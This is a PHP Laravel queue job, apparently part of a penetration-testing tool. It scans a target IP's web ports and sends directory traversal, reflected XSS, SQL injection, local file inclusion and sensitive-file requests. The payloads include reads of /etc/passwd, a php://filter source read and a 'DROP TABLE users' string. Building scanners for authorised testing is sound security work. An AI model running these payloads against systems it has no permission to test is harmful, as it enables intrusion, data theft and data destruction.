<?php

namespace App\Jobs;

use App\Models\PentestSession;
use App\Models\PentestResult;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Queue\Queueable;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class WebVulnScanJob implements ShouldQueue
{
    use Queueable;

    protected $sessionId;
    protected $targetIp;

    public function __construct($sessionId, $targetIp)
    {
        $this->sessionId = $sessionId;
        $this->targetIp = $targetIp;
    }

    public function handle(): void
    {
        try {
            $session = PentestSession::find($this->sessionId);
            if (!$session) {
                return;
            }

            Log::info("Starting web vulnerability scan for {$this->targetIp}");

            // Test for common web services
            $webPorts = [80, 443, 8080, 8443, 8000, 3000, 5000];
            $vulnerabilities = [];

            foreach ($webPorts as $port) {
                if ($this->isPortOpen($this->targetIp, $port)) {
                    $protocol = in_array($port, [443, 8443]) ? 'https' : 'http';
                    $baseUrl = "{$protocol}://{$this->targetIp}:{$port}";
                    
                    // Directory traversal test
                    $this->testDirectoryTraversal($baseUrl, $vulnerabilities);
                    
                    // XSS test
                    $this->testXSS($baseUrl, $vulnerabilities);
                    
                    // SQL injection test
                    $this->testSQLInjection($baseUrl, $vulnerabilities);
                    
                    // File inclusion test
                    $this->testFileInclusion($baseUrl, $vulnerabilities);
                    
                    // Information disclosure
                    $this->testInfoDisclosure($baseUrl, $vulnerabilities);
                }
            }

            // Save results
            foreach ($vulnerabilities as $vuln) {
                PentestResult::create([
                    'session_id' => $session->session_id,
                    'ip_address' => $this->targetIp,
                    'module_type' => 'web_vuln',
                    'test_name' => $vuln['type'],
                    'status' => 'vulnerable',
                    'severity' => $vuln['severity'],
                    'description' => $vuln['type'] . ' vulnerability found',
                    'details' => $vuln['details'],
                    'tested_at' => now(),
                ]);
            }

            Log::info("Web vulnerability scan completed for {$this->targetIp}. Found " . count($vulnerabilities) . " issues.");

        } catch (\Exception $e) {
            Log::error("Web vulnerability scan failed for {$this->targetIp}: " . $e->getMessage());
        }
    }

    private function isPortOpen($ip, $port)
    {
        $connection = @fsockopen($ip, $port, $errno, $errstr, 3);
        if ($connection) {
            fclose($connection);
            return true;
        }
        return false;
    }

    private function testDirectoryTraversal($baseUrl, &$vulnerabilities)
    {
        $payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../windows/win.ini',
            '../../../../../../../../etc/passwd',
        ];

        foreach ($payloads as $payload) {
            try {
                $response = Http::timeout(10)->get($baseUrl . '/' . $payload);
                $content = $response->body();
                
                if ($response->successful() && 
                    (strpos($content, 'root:x:0:0:') !== false || 
                     strpos($content, '[fonts]') !== false ||
                     strpos($content, '127.0.0.1') !== false)) {
                    
                    $vulnerabilities[] = [
                        'type' => 'Directory Traversal',
                        'severity' => 'high',
                        'details' => [
                            'url' => $baseUrl . '/' . $payload,
                            'payload' => $payload,
                            'response_size' => strlen($content),
                            'evidence' => substr($content, 0, 500)
                        ]
                    ];
                    break;
                }
            } catch (\Exception $e) {
                // Continue with other tests
            }
        }
    }

    private function testXSS($baseUrl, &$vulnerabilities)
    {
        $payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
            '<img src=x onerror=alert("XSS")>',
        ];

        $testParams = ['q', 'search', 'input', 'name', 'value', 'data'];

        foreach ($testParams as $param) {
            foreach ($payloads as $payload) {
                try {
                    $response = Http::timeout(10)->get($baseUrl, [$param => $payload]);
                    $content = $response->body();
                    
                    if ($response->successful() && strpos($content, $payload) !== false) {
                        $vulnerabilities[] = [
                            'type' => 'Cross-Site Scripting (XSS)',
                            'severity' => 'medium',
                            'details' => [
                                'url' => $baseUrl . "?{$param}=" . urlencode($payload),
                                'parameter' => $param,
                                'payload' => $payload,
                                'reflected' => true
                            ]
                        ];
                        break 2;
                    }
                } catch (\Exception $e) {
                    // Continue with other tests
                }
            }
        }
    }

    private function testSQLInjection($baseUrl, &$vulnerabilities)
    {
        $payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "1' UNION SELECT null,version(),null--",
        ];

        $testParams = ['id', 'user', 'login', 'search'];
        $errorPatterns = [
            'SQL syntax',
            'mysql_fetch',
            'ORA-01756',
            'Microsoft OLE DB',
            'PostgreSQL query failed'
        ];

        foreach ($testParams as $param) {
            foreach ($payloads as $payload) {
                try {
                    $response = Http::timeout(10)->get($baseUrl, [$param => $payload]);
                    $content = $response->body();
                    
                    foreach ($errorPatterns as $pattern) {
                        if (stripos($content, $pattern) !== false) {
                            $vulnerabilities[] = [
                                'type' => 'SQL Injection',
                                'severity' => 'critical',
                                'details' => [
                                    'url' => $baseUrl . "?{$param}=" . urlencode($payload),
                                    'parameter' => $param,
                                    'payload' => $payload,
                                    'error_pattern' => $pattern,
                                    'evidence' => substr($content, 0, 1000)
                                ]
                            ];
                            break 3;
                        }
                    }
                } catch (\Exception $e) {
                    // Continue with other tests
                }
            }
        }
    }

    private function testFileInclusion($baseUrl, &$vulnerabilities)
    {
        $payloads = [
            'file=../../../etc/passwd',
            'page=../../../../windows/win.ini',
            'include=php://filter/read=convert.base64-encode/resource=index.php',
        ];

        foreach ($payloads as $payload) {
            try {
                $response = Http::timeout(10)->get($baseUrl . '/?' . $payload);
                $content = $response->body();
                
                if ($response->successful() && 
                    (strpos($content, 'root:x:0:0:') !== false || 
                     strpos($content, '[fonts]') !== false ||
                     strpos($content, 'PD9waHA') !== false)) {
                    
                    $vulnerabilities[] = [
                        'type' => 'Local File Inclusion',
                        'severity' => 'high',
                        'details' => [
                            'url' => $baseUrl . '/?' . $payload,
                            'payload' => $payload,
                            'evidence' => substr($content, 0, 500)
                        ]
                    ];
                    break;
                }
            } catch (\Exception $e) {
                // Continue with other tests
            }
        }
    }

    private function testInfoDisclosure($baseUrl, &$vulnerabilities)
    {
        $testPaths = [
            '/robots.txt',
            '/.htaccess',
            '/phpinfo.php',
            '/test.php',
            '/info.php',
            '/.git/config',
            '/backup.sql',
            '/config.php.bak',
        ];

        foreach ($testPaths as $path) {
            try {
                $response = Http::timeout(10)->get($baseUrl . $path);
                
                if ($response->successful()) {
                    $content = $response->body();
                    $severity = 'info';
                    
                    if (strpos($path, 'phpinfo') !== false && strpos($content, 'PHP Version') !== false) {
                        $severity = 'medium';
                    } elseif (strpos($path, '.git') !== false || strpos($path, 'backup') !== false) {
                        $severity = 'high';
                    }
                    
                    $vulnerabilities[] = [
                        'type' => 'Information Disclosure',
                        'severity' => $severity,
                        'details' => [
                            'url' => $baseUrl . $path,
                            'file' => $path,
                            'response_size' => strlen($content),
                            'content_preview' => substr($content, 0, 200)
                        ]
                    ];
                }
            } catch (\Exception $e) {
                // Continue with other tests
            }
        }
    }
}
